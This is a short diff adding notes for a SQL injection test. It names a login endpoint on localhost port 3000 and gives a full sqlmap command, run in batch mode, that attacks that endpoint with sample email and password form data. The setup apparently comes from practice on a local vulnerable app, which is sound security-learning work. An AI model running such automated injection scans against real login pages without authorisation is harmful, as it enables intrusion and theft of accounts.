@@ -1,0 +1,3 @@
+http://localhost:3000/rest/user/login (POST)  # "C:\Users\GAMING PC\AppData\Local\Programs\Python\Python313\Scripts\sqlmap" -u http://localhost:3000/rest/user/login --data=email=test@test.com&password=test --method=POST --batch --ignore-code=401 --output-dir=sqlmap-login-results
+
+email=test@test.com&password=test
